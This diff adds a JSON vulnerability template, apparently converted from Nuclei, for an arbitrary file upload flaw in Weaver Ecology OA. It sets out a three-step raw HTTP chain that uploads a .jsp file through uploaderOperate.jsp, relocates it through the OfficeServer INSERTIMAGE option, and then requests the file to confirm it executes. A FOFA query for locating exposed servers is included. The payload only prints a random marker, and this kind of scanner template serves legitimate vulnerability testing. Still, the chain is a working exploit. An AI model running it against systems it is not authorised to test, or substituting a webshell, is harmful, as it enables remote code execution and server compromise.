@@ -1,0 +1,151 @@
+{
+  "id": "weaver-uploadoperation-file-upload",
+  "name": "Weaver OA Workrelate - Arbitary File Upload",
+  "author": "SleepingBag945",
+  "severity": "CRITICAL",
+  "description": "Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.\n",
+  "references": [
+    "https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g",
+    "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/weaver-oa-workrelate-file-upload.yaml"
+  ],
+  "tags": [
+    "ecology",
+    "fileupload",
+    "intrusive"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"泛微-协同办公OA\""
+  },
+  "variables": {
+    "filename": [
+      "{{to_lower(rand_base(5))}}"
+    ],
+    "string": [
+      "{{randstr}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: */*\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryVdb2RRl25PuaGhWj\nAccept-Encoding: gzip\n\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\nContent-Disposition: form-data; name\u003d\"secId\"\n\n1\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\nContent-Disposition: form-data; name\u003d\"Filedata\"; filename\u003d\"{{filename}}.jsp\"\n\n\u003c%out.println(\"{{string}}\");%\u003e\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\nContent-Disposition: form-data; name\u003d\"plandetailid\"\n\n1\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--\n",
+        "POST /OfficeServer HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: */*\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryVdb2RRl25PuaGhWj\nAccept-Encoding: gzip\n\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\nContent-Disposition: form-data; name\u003d\"aaa\"\n\n{\"OPTION\":\"INSERTIMAGE\",\"isInsertImageNew\":\"1\",\"imagefileid4pic\":\"{{fileid}}\"}\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--\n",
+        "GET /{{filename}}.jsp HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_1 \u003d\u003d 200 \u0026\u0026 contains(body_1,\u0027workrelate/plan/util/ViewDoc\u0027)",
+            "status_code_2 \u003d\u003d 200 \u0026\u0026 contains(body_2, \u0027println\u0027)",
+            "status_code_3 \u003d\u003d 200 \u0026\u0026 contains(body_3,\u0027{{string}}\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "weaver-uploadoperation-file-upload",
+    "info": {
+      "name": "Weaver OA Workrelate - Arbitary File Upload",
+      "author": "SleepingBag945",
+      "severity": "critical",
+      "description": "Ecology contains an arbitrary file upload vulnerability. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.\n",
+      "reference": [
+        "https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g",
+        "https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/weaver-oa-workrelate-file-upload.yaml"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 3,
+        "fofa_query": "app\u003d\"泛微-协同办公OA\""
+      },
+      "tags": "ecology,fileupload,intrusive"
+    },
+    "variables": {
+      "filename": "{{to_lower(rand_base(5))}}",
+      "string": "{{randstr}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /workrelate/plan/util/uploaderOperate.jsp HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: */*\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryVdb2RRl25PuaGhWj\nAccept-Encoding: gzip\n\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\nContent-Disposition: form-data; name\u003d\"secId\"\n\n1\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\nContent-Disposition: form-data; name\u003d\"Filedata\"; filename\u003d\"{{filename}}.jsp\"\n\n\u003c%out.println(\"{{string}}\");%\u003e\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\nContent-Disposition: form-data; name\u003d\"plandetailid\"\n\n1\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--\n",
+          "POST /OfficeServer HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: */*\nContent-Type: multipart/form-data; boundary\u003d----WebKitFormBoundaryVdb2RRl25PuaGhWj\nAccept-Encoding: gzip\n\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\nContent-Disposition: form-data; name\u003d\"aaa\"\n\n{\"OPTION\":\"INSERTIMAGE\",\"isInsertImageNew\":\"1\",\"imagefileid4pic\":\"{{fileid}}\"}\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--\n",
+          "GET /{{filename}}.jsp HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_1 \u003d\u003d 200 \u0026\u0026 contains(body_1,\u0027workrelate/plan/util/ViewDoc\u0027)",
+              "status_code_2 \u003d\u003d 200 \u0026\u0026 contains(body_2, \u0027println\u0027)",
+              "status_code_3 \u003d\u003d 200 \u0026\u0026 contains(body_3,\u0027{{string}}\u0027)"
+            ],
+            "condition": "and"
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "\u0026fileid\u003d(.*?)\\\u0027\u003e"
+            ],
+            "group": 1,
+            "name": "fileid",
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
